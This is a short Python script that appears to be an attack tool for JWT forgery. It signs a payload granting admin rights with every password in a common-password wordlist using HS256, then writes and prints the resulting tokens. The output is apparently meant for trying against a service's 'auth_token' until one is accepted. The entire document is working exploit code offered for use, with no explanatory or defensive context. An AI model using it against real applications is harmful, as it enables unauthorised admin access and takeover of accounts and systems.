import os
import jwt
from typing import Dict, Union

JWT_TYPE = Dict[str, Union[str, bool]]
DEFAULT_TOKEN = {"admin": True}
TOKEN_NAME = "auth_token"
ALGORITHM = "HS256"

def encode_jwt(data: JWT_TYPE, password: str) -> str:
    """Encode Dict to JWT"""
    return jwt.encode(data, password, ALGORITHM)

# Read the list of passwords from the input file
with open("common.txt" , "r", encoding="ISO-8859-1") as file:
    passwords = [line.strip() for line in file]

# Generate JWT tokens and store them in the output file
with open("output_tokens.txt", "w") as file:
    for password in passwords:
        JWT_DEFAULT_TOKEN = encode_jwt(DEFAULT_TOKEN, password)
        file.write(f"{JWT_DEFAULT_TOKEN}\n")
        print(f"{JWT_DEFAULT_TOKEN}")
